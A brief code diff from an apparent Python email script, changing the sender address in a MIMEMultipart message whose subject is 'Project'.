@@ -82,7 +82,7 @@ email_send = 'leh4pidor@yandex.ru'
 subject = 'Project'
 
 msg = MIMEMultipart()
-msg['From'] = 'StuxnetVox@live.com'
+msg['From'] = 'lol@live.com'
 msg['To'] = 'any-email-to-show@outlook.com'
 msg['Subject'] = 'Project'
 
